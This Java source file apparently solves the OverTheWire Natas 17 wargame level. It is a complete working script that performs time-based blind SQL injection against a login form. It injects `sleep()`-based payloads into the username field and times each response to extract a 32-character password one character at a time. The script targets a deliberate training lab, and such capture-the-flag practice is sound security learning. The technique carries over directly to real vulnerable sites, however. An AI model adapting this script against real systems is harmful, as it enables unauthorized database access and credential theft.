import org.apache.commons.lang.time.StopWatch;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by alexk on 12.07.2017.
 */
public class BlindSqlInjectBruteForce {
    static String marker = "This user exists.";
    static String avaibleChars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    public static void main(String[] args) throws Exception {
        StopWatch stopWatch = new StopWatch();
        stopWatch.start();
        String url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
        BasicCredentialsProvider credentialsProvider = new BasicCredentialsProvider();
        UsernamePasswordCredentials natas17 = new UsernamePasswordCredentials("natas17", "<censored>");
        credentialsProvider.setCredentials(AuthScope.ANY, natas17);

        String passwordChars = "";
        for (char c : avaibleChars.toCharArray()) {
            HttpPost post = generateRequest(url, "natas18\" AND IF(password LIKE BINARY '%" + c + "%', sleep(2), 0);#");
            long beforeRequest = System.currentTimeMillis();
            HttpResponse response = getClient(credentialsProvider).execute(post);
            long afterRequest = System.currentTimeMillis();
            if (passwordMatches(response, afterRequest - beforeRequest)) {
                passwordChars += c;
                System.out.println(c);
            }
        }
        stopWatch.stop();
        System.out.println("Char selected, time: " + stopWatch.toString());
        System.out.println("Starting password generation");
        stopWatch.reset();
        stopWatch.start();
        String password = "";
        for (int i = 0; i < 32; i++) {
            for (char c : passwordChars.toCharArray()) {
                HttpPost post = generateRequest(url, "natas18\" AND IF(password LIKE BINARY '" + password + c + "%', sleep(2), 0);#");
                long beforeRequest = System.currentTimeMillis();
                HttpResponse response = getClient(credentialsProvider).execute(post);
                long afterRequest = System.currentTimeMillis();
                if (passwordMatches(response, afterRequest - beforeRequest)) {
                    password += c;
                    System.out.println(password);
                }
            }
        }
        stopWatch.stop();
        System.out.println("Password selected, time: " + stopWatch.toString());
        System.out.println("Done: " + password);
    }

    private static CloseableHttpClient getClient(BasicCredentialsProvider credentialsProvider) {
        return HttpClientBuilder.create().setDefaultCredentialsProvider(credentialsProvider).build();
    }

    private static boolean passwordMatches(HttpResponse response, long duration) throws IOException {
        boolean biggerThanLimit = duration >= 2000;
//        if (!biggerThanLimit) {
//            System.out.println("Small duration: " + duration);
//        }
        return response.getStatusLine().getStatusCode() == 200 && biggerThanLimit;
    }

    private static HttpPost generateRequest(String url, String query) throws UnsupportedEncodingException {
        HttpPost post = new HttpPost(url);
        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("username", query));
        post.setEntity(new UrlEncodedFormEntity(params));
        return post;
    }
}
